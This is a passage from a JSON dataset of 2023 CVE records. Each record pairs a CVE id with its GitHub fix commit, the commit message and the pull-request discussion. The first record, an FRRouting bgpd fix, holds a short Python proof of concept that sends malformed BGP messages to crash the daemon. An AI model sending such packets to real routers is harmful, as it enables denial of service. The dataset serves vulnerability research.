(b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 198,
            "other_info": "bgpd: A couple more bgpd crashes on malformed attributes @Mergifyio backport dev/9.1 stable/9.0 stable/8.5 > backport dev/9.1 stable/9.0 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14653 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14653) has been created for branch `dev/9.1`\n* [#14654 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14654) has been created for branch `stable/9.0`\n* [#14655 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14655) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1 stable/9.0 stable/8.5\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15929 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/15929) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 9,
            "comments_words": 152,
            "total_other_info_words": 161
        },
        {
            "cve-id": "CVE-2023-29638",
            "commit_url": "https://github.com/WinterChenS/my-site/commit/d104f38aaae2f1b76c33fadfcf6b1ef1c6c340ed",
            "commit_msg": "fix\uff1aThere is a stored XSS on the article page. #74",
            "commit_msg_words": 10,
            "other_info": "bug fix",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-0869",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/66b4ba96a18b9952f25a350bbccc2a7e206238d1",
            "commit_msg": "NMS-15294: Escaping parameter names in generated query strings",
            "commit_msg_words": 8,
            "other_info": "NMS-15294: Escaping parameter names in generated query strings",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-37471",
            "commit_url": "https://github.com/OpenIdentityPlatform/OpenAM/commit/7c18543d126e8a567b83bb4535631825aaa9d742",
            "commit_msg": "GHSL-2023-143, GHSL-2023-144, deny unsigned SAML response (#624)",
            "commit_msg_words": 7,
            "other_info": "GHSL-2023-143, GHSL-2023-144, deny unsigned SAML response Have you considered removing the `if (samlResponse.isSigned())` check in [`SAMLUtils.processResponse`](https://github.com/OpenIdentityPlatform/OpenAM/blob/3974a1aa0d413192a168aadb1ad49776efef3c02/openam-federation/openam-federation-library/src/main/java/com/sun/identity/saml/common/SAMLUtils.java#L1583) as well? As it is now it looks a bit like a footgun to me: if someone uses the method somewhere else where validating the signature is a requirement, the same issue that is being fixed here could reproduce. @atorralba,\r\nYes, thank you, it is a good point!",
            "pr_title_words": 6,
            "comments_words": 58,
            "total_other_info_words": 64
        },
        {
            "cve-id": "CVE-2023-39949",
            "commit_url": "https://github.com/eProsima/Fast-DDS/commit/60c15edf9e5ddf813d3ea25fa3ef2ccdae4e11a6",
            "commit_msg": "Implement a validity check for firstSN\n\nFollowing 8.3.8.6.3 of DDS-RTPS 2.5.\nThis fixes issue #3236.\n\nSigned-off-by: Seulbae Kim <squizz617@gmail.com>",
            "commit_msg_words": 19,
            "other_info": "Implement a validity check for firstSN Sorry, made a mistake while moving stuffs into the pr branch :(\r\nFixed and pushed! Hi @MiguelCompany, I'm just wondering if you've looked at the changes. Thank you. > Hi @MiguelCompany, I'm just wondering if you've looked at the changes. Thank you.\r\n\r\n@squizz617 Changes look good to me. Is it possible that you could add a regression test for this?\r\n\r\nI think that adding a new file [here](https://github.com/eProsima/Fast-DDS/tree/master/fuzz/C%2B%2B/fuzz_processCDRMsg/fuzz_processCDRMsg_seed_corpus) would be enough @MiguelCompany Done! I temporarily named the file `input_issue3236`, but please change it if needed. @richiprosima Please test this @mergifyio backport 2.9.x 2.8.x 2.6.x > backport 2.9.x 2.8.x 2.6.x\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#3382 Implement a validity check for firstSN (backport #3274)](https://github.com/eProsima/Fast-DDS/pull/3382) has been created for branch `2.9.x`\n* [#3383 Implement a validity check for firstSN (backport #3274)](https://github.com/eProsima/Fast-DDS/pull/3383) has been created for branch `2.8.x`\n* [#3384 Implement a validity check for firstSN (backport #3274)](https://github.com/eProsima/Fast-DDS/pull/3384) has been created for branch `2.6.x`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport 2.9.x 2.8.x 2.6.x\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 6,
            "comments_words": 176,
            "total_other_info_words": 182
        },
        {
            "cve-id": "CVE-2023-33204",
            "commit_url": "https://github.com/sysstat/sysstat/commit/954ff2e2673cef48f0ed44668c466eab041db387",
            "commit_msg": "Fix an overflow which is still possible for some values.",
            "commit_msg_words": 10,
            "other_info": "Fix an overflow which is still possible for some values. ```\r\ncommon.c:437:71: error: expected ')' before '{' token\r\n  437 |                 (unsigned long long)val2) < (unsigned long long)val3)) {\r\n```\r\nmissing ) > ```\r\n> common.c:437:71: error: expected ')' before '{' token\r\n>   437 |                 (unsigned long long)val2) < (unsigned long long)val3)) {\r\n> ```\r\n> \r\n> missing )\r\n\r\nYou are right, thank you. Fortunately, this typo has been fixed during merging.",
            "pr_title_words": 10,
            "comments_words": 61,
            "total_other_info_words": 71
        },
        {
            "cve-id": "CVE-2023-4508",
            "commit_url": "https://github.com/gerbv/gerbv/commit/5517e22250e935dc7f86f64ad414aeae3dbcb36a",
            "commit_msg": "fix: Out-of-bounds memory access of filename.\n\nPut all the filename allocation and deallocation into the `gerb_fopen`\nand `gerb_fclose` functions so that the caller doesn't need to deal\nwith this anymore.\n\nAlso, free includeFilename.  It was allocated as part of\n`gerb_fgetstring()` above but never freed properly.\n\nUnit tests added to valgrind.",
            "commit_msg_words": 50,
            "other_info": "fix: Out-of-bounds memory access in strtok. This is currently a draft.  It has a unit test but no fix yet. Thank you for the testcase! I think the best way forward is to set a default value for `fd->filename` in `gerb_fopen`. I was considering `strdup`ing the `filename` argument, but that might lead to even more memory leaks.\r\n\r\nThus I'll try setting it to `nullptr` first. I have tried both `nullptr` and `\"\"` as default initialization. In both cases the *Conditional jump or move depends on uninitialised value* message goes away, but valgrind does not pass, either.\r\n\r\nHowever, I cannot make out the cause of the error. Do you see an error: https://github.com/ooxi/gerbv/actions/runs/5545198229/jobs/10123767309? ```\r\n==32056== 28 bytes in 1 blocks are definitely lost in loss record 110 of 296\r\n==32056==    at 0x483C855: malloc (vg_replace_malloc.c:393)\r\n==32056==    by 0x506BE98: g_malloc (in /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6)\r\n==32056==    by 0x4865BD6: gerb_fgetstring (gerb_file.c:219)\r\n==32056==    by 0x486BFC1: parse_rs274x (gerber.c:1450)\r\n==32056==    by 0x486A68F: gerber_parse_file_segment (gerber.c:245)\r\n==32056==    by 0x486E507: parse_gerb (gerber.c:770)\r\n==32056==    by 0x486F148: gerbv_open_image (gerbv.c:571)\r\n==32056==    by 0x486F59B: gerbv_open_layer_from_filename_with_color (gerbv.c:249)\r\n==32056==    by 0x11B452: main (main.c:941)\r\n```\r\n\r\n@ooxi Setting it to `nullptr` or `\"\"` fixed the problem of trying to read bad memory.  However, it exposed a different problem, which I also encountered, same as you!  It's saying that there is memory that was allocated but never freed, and it shows the stack trace to that allocation.  Along that path, I can see `parse_rs274x (gerber.c:1450)`.  In the code, it's here: https://github.com/gerbv/gerbv/blob/caa6560d5d683f827c672fd5e380f89a8ef632b6/src/gerber.c#L1450-L1480\r\n\r\nLooking into the code for that call to `gerb_fgetstring`, I see: https://github.com/gerbv/gerbv/blob/caa6560d5d683f827c672fd5e380f89a8ef632b6/src/gerb_file.c#L196-L224\r\n\r\nThere's a `g_malloc` in there with no corresponding free.  So it needs to be free'd!  We've never caught this before in valgrind because we have never covered this part of the code with valgrind.  :-(  So that's where the memory is getting lost.  You can see that the size lost is 28 bytes and the file name that @iosifache chose was `parse_aperture_strtok.2.poc` and that's 27 letters.  Add one for the terminating null and it's 28, same as the `malloc` size.",
            "pr_title_words": 6,
            "comments_words": 325,
            "total_other_info_words": 331
        },
        {
            "cve-id": "CVE-2023-38494",
            "commit_url": "https://github.com/metersphere/metersphere/commit/a23f75d93b666901fd148d834df9384f6f24cf28",
            "commit_msg": "fix: \u589e\u52a0\u7528\u6237\u7ec4\u63a5\u53e3\u7684\u6743\u9650\u6821\u9a8c",
            "commit_msg_words": 2,
            "other_info": "fix: \u589e\u52a0\u7528\u6237\u7ec4\u63a5\u53e3\u7684\u6743\u9650\u6821\u9a8c [APPROVALNOTIFIER] This PR is **NOT APPROVED**\n\nThis pull-request has been approved by:\nTo complete the [pull request process](https://git.k8s.io/community/contributors/guide/owners.md#the-code-review-process), please assign **liuruibin** after the PR has been reviewed.\nYou can assign the PR to them by writing `/assign @liuruibin` in a comment when ready.\n\nThe full list of commands accepted by this bot can be found [here](https://go.k8s.io/bot-commands?repo=metersphere%2Fmetersphere).\n\n<details open>\nNeeds approval from an approver in each of these files:\n\n- **[OWNERS](https://github.com/metersphere/metersphere/blob/v2.10/OWNERS)**\n\nApprovers can indicate their approval by writing `/approve` in a comment\nApprovers can cancel approval by writing `/approve cancel` in a comment\n</details>\n<!-- META={\"approvers\":[\"liuruibin\"]} -->",
            "pr_title_words": 2,
            "comments_words": 96,
            "total_other_info_words": 98
        },
        {
            "cve-id": "CVE-2023-38857",
            "commit_url": "https://github.com/knik0/faad2/commit/b02a9ee5bf071fa92563536c076a69dbec814e7e",
            "commit_msg": "Fix #171 (#175)\n\n(slicen + 1) should not run after the array boundary;\r\nto avoid possible overflow, we now check in 2 steps,\r\nchained with short-circuit-and.",
            "commit_msg_words": 26,
            "other_info": "Fix #171",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-28425",
            "commit_url": "https://github.com/redis/redis/commit/48e0d4788434833b47892fe9f3d91be7687f25c9",
            "commit_msg": "Avoid assertion when MSETNX is used with the same key twice (CVE-2023-28425) (#11940)\n\nUsing the same key twice in MSETNX command would trigger an assertion.\r\n\r\nThis reverts #11594 (introduced in Redis 7.0.8)",
            "commit_msg_words": 32,
            "other_info": "Avoid assertion when MSETNX is used with the same key twice (CVE-2023-28425)",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-50245",
            "commit_url": "https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9",
            "commit_msg": "Early catch potential overflow issue #43\n\n`m_width` and `m_height` are of `int` type in the OpenEXR library. We\ncurrently keep the same types in our class but this may case issue\nwhen mapping 1D memory. In the most favorable case, they are\nmultiplied together (Y framebuffer). For RGB(A) case, the required\nmemory can also be 4 time larger. We check if resp. `m_width *\nm_height` and `4 * m_width * m_heigh` stay within the `int` higher\nlimit. Thanks to @GAP-dev for bringing this issue.\n\nThis commit also cleans a bit raw memory allocation in favor of\n`std::vector` container.",
            "commit_msg_words": 98,
            "other_info": "Fix segfault",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-32310",
            "commit_url": "https://github.com/dataease/dataease/commit/72f428e87b5395c03d2f94ef6185fc247ddbc8dc",
            "commit_msg": "feat(\u4eea\u8868\u677f): \u5220\u9664\u5206\u4eabIDOR\u6f0f\u6d1e",
            "commit_msg_words": 2,
            "other_info": "feat(\u4eea\u8868\u677f): \u5220\u9664\u5206\u4eabIDOR\u6f0f\u6d1e",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-38407",
            "commit_url": "https://github.com/FRRouting/frr/commit/7404a914b0cafe046703c8381903a80d3def8f8b",
            "commit_msg": "bgpd: Fix use beyond end of stream of labeled unicast parsing\n\nFixes a couple crashes associated with attempting to read\nbeyond the end of the stream.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donald Sharp <sharpd@nvidia.com>",
            "commit_msg_words": 34,
            "other_info": "bgpd: Fix use beyond end of stream of labeled unicast parsing @mergifyio backport stable/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0 > backport stable/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0\n\n#### \u274c No backport have been created\n\n<details>\n\n* Backport to branch `stable/8.5` failed\n\nGitHub error: ```Branch not found```\n* Backport to branch `stable/8.4` in progress\n* Backport to branch `stable/8.3` in progress\n* Backport to branch `stable/8.2` in progress\n* Backport to branch `stable/8.1` in progress\n* Backport to branch `stable/8.0` in progress\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0\", \"conclusion\": \"failure\"}\n-*- Mergify Payload End -*-\n--> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10043/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0 > backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#12956 bgpd: Fix use beyond end of stream of labeled unicast parsing (backport #12951)](https://github.com/FRRouting/frr/pull/12956) has been created for branch `dev/8.5`\n* Backport to branch `stable/8.4` in progress\n* Backport to branch `stable/8.3` in progress\n* Backport to branch `stable/8.2` in progress\n* Backport to branch `stable/8.1` in progress\n* Backport to branch `stable/8.0` in progress\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 stable/8.0\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15926 bgpd: Fix use beyond end of stream of labeled unicast parsing (backport #12951)](https://github.com/FRRouting/frr/pull/15926) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 11,
            "comments_words": 307,
            "total_other_info_words": 318
        },
        {
            "cve-id": "CVE-2023-27786",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/df18c48812462ea802d639d2477887055666ee58",
            "commit_msg": "Add check after call strtok_r",
            "commit_msg_words": 5,
            "other_info": "Fix bugs caused by strtok_r Hi,\r\n\r\nCVE-2023-27786 has been created for the https://github.com/appneta/tcpreplay/issues/782.\r\nAny plan to review and merge this PR @fklassen \r\n\r\nCould you please review this PR as well. Will review this and all PR's this weekend. I usually take some vacation days to do next point release, but I'll do some high priority ones sooner rather than later. Thank you",
            "pr_title_words": 5,
            "comments_words": 57,
            "total_other_info_words": 62
        },
        {
            "cve-id": "CVE-2023-48704",
            "commit_url": "https://github.com/ClickHouse/ClickHouse/commit/a6b659cf04f18cf28d508809ed53754bf6e5c0b2",
            "commit_msg": "Fix buffer overflow in Gorilla codec",
            "commit_msg_words": 6,
            "other_info": "Fix buffer overflow in Gorilla codec <!-- automatic status comment for PR #57107 from evillique/ClickHouse:gix-gorilla-overflow-issue -->\n*This is an automated comment for commit 761b55ccf4e2a4cd449381fa5742face4c256001 with description of existing statuses. It's updated for the latest CI running*\n\n[\u274c Click here](https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/ci_running.html) to open a full report in a separate page\n\n<details><summary>Successful checks</summary>\n<table>\n<thead><tr><th>Check name</th><th>Description</th><th>Status</th></tr></thead>\n<tbody>\n<tr><td>AST fuzzer</td><td>Runs randomly generated queries to catch program errors. The build type is optionally given in parenthesis. If it fails, ask a maintainer for help</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/fuzzer_astfuzzerasan/report.html\">\u2705 success</a></td></tr>\n<tr><td>Bugfix validate check</td><td>Checks that either a new test (functional or integration) or there some changed tests that fail with the binary built on master branch</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/bugfix_validate_check.html\">\u2705 success</a></td></tr>\n<tr><td>CI running</td><td>A meta-check that indicates the running CI. Normally, it's in <b>success</b> or <b>pending</b> state. The failed status indicates some problems with the PR</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/ci_running.html\">\u2705 success</a></td></tr>\n<tr><td>ClickHouse build check</td><td>Builds ClickHouse in various configurations for use in further steps. You have to fix the builds that fail. Build logs often has enough information to fix the error, but you might have to reproduce the failure locally. The <b>cmake</b> options can be found in the build log, grepping for <b>cmake</b>. Use these options and follow the <a href=\"https://clickhouse.com/docs/en/development/build\">general build process</a></td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/clickhouse_build_check/report.html\">\u2705 success</a></td></tr>\n<tr><td>Compatibility check</td><td>Checks that <b>clickhouse</b> binary runs on distributions with old libc versions. If it fails, ask a maintainer for help</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/compatibility_check__aarch64_.html\">\u2705 success</a></td></tr>\n<tr><td>Docker image for servers</td><td>The check to build and optionally push the mentioned image to docker hub</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/docker_image_clickhouse_clickhouse-keeper_building_check.html\">\u2705 success</a></td></tr>\n<tr><td>Fast test</td><td>Normally this is the first check that is ran for a PR. It builds ClickHouse and runs most of <a href=\"https://clickhouse.com/docs/en/development/tests#functional-tests\">stateless functional tests</a>, omitting some. If it fails, further checks are not started until it is fixed. Look at the report to see which tests fail, then reproduce the failure locally as described <a href=\"https://clickhouse.com/docs/en/development/tests#functional-test-locally\">here</a></td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/fast_test.html\">\u2705 success</a></td></tr>\n<tr><td>Flaky tests</td><td>Checks if new added or modified tests are flaky by running them repeatedly, in parallel, with more randomization. Functional tests are run 100 times with address sanitizer, and additional randomization of thread scheduling. Integrational tests are run up to 10 times. If at least once a new test has failed, or was too long, this check will be red. We don't allow flaky tests, read <a href=\"https://clickhouse.com/blog/decorating-a-christmas-tree-with-the-help-of-flaky-tests/\">the doc</a></td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/integration_tests_flaky_check__asan_.html\">\u2705 success</a></td></tr>\n<tr><td>Install packages</td><td>Checks that the built packages are installable in a clear environment</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/install_packages__amd64_.html\">\u2705 success</a></td></tr>\n<tr><td>Performance Comparison</td><td>Measure changes in query performance. The performance test report is described in detail <a href=\"https://github.com/ClickHouse/ClickHouse/tree/master/docker/test/performance-comparison#how-to-read-the-report\">here</a>. In square brackets are the optional part/total tests</td><td><a href=\"https://github.com/ClickHouse/ClickHouse/actions/runs/6960241423\">\u2705 success</a></td></tr>\n<tr><td>Push to Dockerhub</td><td>The check for building and pushing the CI related docker images to docker hub</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/push_multi-arch_images_to_dockerhub.html\">\u2705 success</a></td></tr>\n<tr><td>SQLTest</td><td>There's no description for the check yet, please add it to tests/ci/ci_config.py:CHECK_DESCRIPTIONS</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/sqltest_sqltest/report.html\">\u2705 success</a></td></tr>\n<tr><td>SQLancer</td><td>Fuzzing tests that detect logical bugs with <a href=\"https://github.com/sqlancer/sqlancer\">SQLancer</a> tool</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/sqlancer__debug_.html\">\u2705 success</a></td></tr>\n<tr><td>Sqllogic</td><td>Run clickhouse on the <a href=\"https://www.sqlite.org/sqllogictest\">sqllogic</a> test set against sqlite and checks that all statements are passed</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/sqllogic_test__release_.html\">\u2705 success</a></td></tr>\n<tr><td>Stateful tests</td><td>Runs stateful functional tests for ClickHouse binaries built in various configurations -- release, debug, with sanitizers, etc</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/stateful_tests__aarch64_.html\">\u2705 success</a></td></tr>\n<tr><td>Stress test</td><td>Runs stateless functional tests concurrently from several clients to detect concurrency-related errors</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/stress_test__asan_.html\">\u2705 success</a></td></tr>\n<tr><td>Style Check</td><td>Runs a set of checks to keep the code style clean. If some of tests failed, see the related log from the report</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/style_check.html\">\u2705 success</a></td></tr>\n<tr><td>Unit tests</td><td>Runs the unit tests for different release types</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/unit_tests__asan_.html\">\u2705 success</a></td></tr>\n<tr><td>Upgrade check</td><td>Runs stress tests on server version from last release and then tries to upgrade it to the version from the PR. It checks if the new server can successfully startup without any errors, crashes or sanitizer asserts</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/upgrade_check__asan_.html\">\u2705 success</a></td></tr>\n<tbody>\n</table>\n</details>\n<table>\n<thead><tr><th>Check name</th><th>Description</th><th>Status</th></tr></thead>\n<tbody>\n<tr><td>Integration tests</td><td>The integration tests report. In parenthesis the package type is given, and in square brackets are the optional part/total tests</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/integration_tests__asan__[1_4].html\">\u274c failure</a></td></tr>\n<tr><td>Mergeable Check</td><td>Checks if all other necessary checks are successful</td><td><a href=\"https://github.com/ClickHouse/ClickHouse/actions/runs/6960241423\">\u274c failure</a></td></tr>\n<tr><td>Stateless tests</td><td>Runs stateless functional tests for ClickHouse binaries built in various configurations -- release, debug, with sanitizers, etc</td><td><a href=\"https://s3.amazonaws.com/clickhouse-test-reports/57107/761b55ccf4e2a4cd449381fa5742face4c256001/stateless_tests__release_.html\">\u274c failure</a></td></tr>\n<tbody>\n</table>",
            "pr_title_words": 6,
            "comments_words": 639,
            "total_other_info_words": 645
        },
        {
            "cve-id": "CVE-2023-50471",
            "commit_url": "https://github.com/DaveGamble/cJSON/commit/60ff122ef5862d04b39b150541459e7f5e35add8",
            "commit_msg": "add NULL checkings (#809)\n\n* add NULL checks in cJSON_SetValuestring\r\n\r\nFixes #803(CVE-2023-50472)\r\n\r\n* add NULL check in cJSON_InsertItemInArray\r\n\r\nFixes #802(CVE-2023-50471)\r\n\r\n* add tests for NULL checks\r\n\r\nadd tests for NULL checks in cJSON_InsertItemInArray and cJSON_SetValuestring",
            "commit_msg_words": 35,
            "other_info": "add NULL checkings LGTM",
            "pr_title_words": 3,
            "comments_words": 1,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-3724",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/00f1eddee429ff51390b20caadd2eb6afe51e1aa",
            "commit_msg": "add tls extension sanity check",
            "commit_msg_words": 5,
            "other_info": "add tls extension sanity check retest this please Jenkins",
            "pr_title_words": 5,
            "comments_words": 4,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2023-51387",
            "commit_url": "https://github.com/apache/hertzbeat/commit/8dcf050e27ca95d15460a7ba98a3df8a9cd1d3d2",
            "commit_msg": "fix: expression injection RCE (#1241)",
            "commit_msg_words": 5,
            "other_info": "fix: expression injection RCE",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-39976",
            "commit_url": "https://github.com/ClusterLabs/libqb/commit/1bbaa929b77113532785c408dd1b41cd0521ffc8",
            "commit_msg": "log: fix potential overflow with long log messages (#490)\n\nqb_vsnprintf_serialize was called with 'max_size' as the\r\nlimiting number for the length of the formatted log\r\nmessage. But the buffer also needs to contain the\r\nlog header (given by 'actual_size'), so we now pass\r\n't->max_line_length' as the maximum length of the\r\nformatted log message to limit space to the actual \r\nbytes left\r\n\r\nAlso added error checks to the blackbox calls at\r\nthe end of the test, as these now provide a proper\r\ntest that the BB is functioning. Before they were\r\nmasking failures.",
            "commit_msg_words": 92,
            "other_info": "log: fix potential overflow with long log messages The ellipsis code has been in there for ages, but it needs to be enabled:\r\n\r\n        rc = qb_log_ctl(t, QB_LOG_CONF_ELLIPSIS, QB_TRUE);\r\n\r\n0ec02f9ac589e9e21e447f4406ec104ade01ef73\r\n\r\n > The ellipsis code has been in there for ages, but it needs to be enabled:\r\n> \r\n> ```\r\n>     rc = qb_log_ctl(t, QB_LOG_CONF_ELLIPSIS, QB_TRUE);\r\n> ```\r\n> \r\n> [0ec02f9](https://github.com/ClusterLabs/libqb/commit/0ec02f9ac589e9e21e447f4406ec104ade01ef73)\r\n\r\nlog_blackbox.c doesn't use qb_log_target_format() (I'm not familiar enough with the code to know why not), so the ellipsis code isn't hit",
            "pr_title_words": 8,
            "comments_words": 72,
            "total_other_info_words": 80
        },
        {
            "cve-id": "CVE-2023-49286",
            "commit_url": "https://github.com/squid-cache/squid/commit/6014c6648a2a54a4ecb7f952ea1163e0798f9264",
            "commit_msg": "Exit without asserting when helper process startup fails (#1543)\n\n... to dup() after fork() and before execvp().\n\nAssertions are for handling program logic errors. Helper initialization\ncode already handled system call errors correctly (i.e. by exiting the\nnewly created helper process with an error), except for a couple of\nassert()s that could be triggered by dup(2) failures.\n\nThis bug was discovered and detailed by Joshua Rogers at\nhttps://megamansec.github.io/Squid-Security-Audit/ipc-assert.html\nwhere it was filed as 'Assertion in Squid \"Helper\" Process Creator'.",
            "commit_msg_words": 79,
            "other_info": "v6 Next Backports",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-23759",
            "commit_url": "https://github.com/facebookincubator/fizz/commit/8d3649841597bedfb6986c30431ebad0eb215265",
            "commit_msg": "Check HelloRetryRequest cipher consistency earlier.\n\nCVE-2023-23759\r\n\r\nCo-authored-by: Facebook Community Bot <6422482+facebook-github-bot@users.noreply.github.com>\r\n\r\nDifferential Revision: D42508182",
            "commit_msg_words": 14,
            "other_info": "Re-sync with internal repository",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-5686",
            "commit_url": "https://github.com/radareorg/radare2/commit/1bdda93e348c160c84e30da3637acef26d0348de",
